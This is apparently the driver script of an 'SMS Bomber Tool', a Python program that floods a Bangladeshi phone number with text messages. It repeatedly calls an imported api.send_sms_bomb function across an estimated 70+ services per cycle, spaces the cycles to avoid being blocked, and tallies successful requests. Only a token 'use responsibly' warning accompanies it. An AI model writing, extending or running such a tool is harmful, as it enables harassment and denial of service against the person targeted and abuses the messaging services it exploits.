import api
import json
import time
import threading
from datetime import datetime

class SMSBomber:
    def __init__(self):
        self.running = False
        self.completed_cycles = 0
        self.total_success = 0
        
    def single_attack(self, phone):
        """Execute a single attack cycle"""
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Starting attack cycle {self.completed_cycles + 1}...")
        
        try:
            result = api.send_sms_bomb(phone)
            
            # Count successful requests
            success_count = 0
            total_services = 0
            
            for service, response in result.items():
                if service != 'timestamp':
                    total_services += 1
                    if response.get('status') in [200, 201]:
                        success_count += 1
            
            self.completed_cycles += 1
            self.total_success += success_count
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Cycle {self.completed_cycles} completed. Success: {success_count}/{total_services} services")
            
            return success_count
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Error in cycle {self.completed_cycles + 1}: {str(e)}")
            self.completed_cycles += 1
            return 0
    
    def start_attack(self, phone, amount):
        """Start the SMS bombing attack"""
        print(f"\n🚀 Starting SMS Bombing Attack")
        print(f"📱 Target: {phone}")
        print(f"🎯 Amount: {amount} cycles")
        print(f"⏰ Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
        
        self.running = True
        self.completed_cycles = 0
        self.total_success = 0
        start_time = time.time()
        
        try:
            for i in range(amount):
                if not self.running:
                    break
                    
                success_count = self.single_attack(phone)
                
                # Show progress
                progress = (i + 1) / amount * 100
                print(f"📊 Progress: {i+1}/{amount} ({progress:.1f}%) - Total Success: {self.total_success}")
                
                # Add delay between cycles to avoid being blocked
                if i < amount - 1:  # Don't delay after the last cycle
                    print("⏳ Waiting 3 seconds before next cycle...")
                    time.sleep(3)
                    
        except KeyboardInterrupt:
            print("\n⏹️  Attack interrupted by user")
        
        end_time = time.time()
        total_time = end_time - start_time
        
        print("=" * 60)
        print(f"✅ Attack completed!")
        print(f"📊 Total cycles: {self.completed_cycles}")
        print(f"🎯 Total successful requests: {self.total_success}")
        print(f"⏱️  Total time: {total_time:.2f} seconds")
        print(f"⏰ Finished at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        self.running = False
    
    def stop_attack(self):
        """Stop the ongoing attack"""
        self.running = False
        print("🛑 Stopping attack...")

def main():
    bomber = SMSBomber()
    
    print("🔥 SMS Bomber Tool")
    print("=" * 40)
    print("⚠️  WARNING: Use responsibly and only for legitimate testing purposes!")
    print("=" * 40)
    
    try:
        # Get user input
        phone = input("Enter Bangladeshi phone number (e.g., 01712345678): ").strip()
        
        # Validate phone format
        if not api.validate_bangladeshi_phone(phone):
            print("❌ Invalid Bangladeshi phone number format!")
            print("✅ Valid formats: 01712345678, +8801712345678, 8801712345678")
            return
        
        try:
            amount = int(input("Enter number of attack cycles (1-100): ").strip())
        except ValueError:
            print("❌ Please enter a valid number!")
            return
        
        if amount <= 0 or amount > 100:
            print("❌ Amount must be between 1 and 100")
            return
        
        # Confirm attack
        print(f"\n⚠️  CONFIRM ATTACK:")
        print(f"Target: {phone}")
        print(f"Cycles: {amount}")
        print(f"Estimated services per cycle: 70+")
        print(f"Estimated total requests: {amount * 70}+")
        confirmation = input("Type 'CONFIRM' to proceed: ").strip().upper()
        
        if confirmation != 'CONFIRM':
            print("❌ Attack cancelled")
            return
        
        print("\n🎯 Starting attack in 3 seconds...")
        time.sleep(3)
        
        # Start attack
        bomber.start_attack(phone, amount)
        
    except ValueError:
        print("❌ Invalid amount. Please enter a valid number.")
    except KeyboardInterrupt:
        print("\n❌ Operation cancelled by user")
    except Exception as e:
        print(f"❌ An error occurred: {str(e)}")

if __name__ == "__main__":
    main()
